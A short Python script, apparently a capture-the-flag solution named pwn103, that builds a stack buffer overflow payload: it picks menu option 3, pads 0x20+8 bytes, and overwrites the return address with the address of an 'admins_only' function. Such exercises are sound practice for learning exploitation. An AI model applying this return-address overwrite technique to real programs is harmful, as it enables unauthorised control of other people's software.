# pwn103.py

import sys

rip = b'\x5c\x15\x40'

payload =   b'3\n'              # select menu option 3 (General)
payload +=  b'A'*(0x20 + 8)     # fill the buffer up to where we want to write
payload +=  rip                 # write admins_only address
payload +=  b'\n'               # send input

sys.stdout.buffer.write(payload)
